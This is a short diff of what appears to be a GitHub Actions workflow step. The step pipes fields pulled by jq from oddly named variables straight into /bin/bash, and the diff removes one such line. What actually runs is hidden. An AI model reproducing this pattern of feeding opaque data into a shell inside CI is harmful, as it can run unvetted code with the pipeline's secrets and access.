@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$l2" | jq -r .t20236 | /bin/bash
           echo $ncmpf7 | jq -r .s71 | /bin/bash
           echo $y86672 | jq -r .r46 | /bin/bash
-          printf '%s' "$cfya3054" | jq -r .dxso66 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
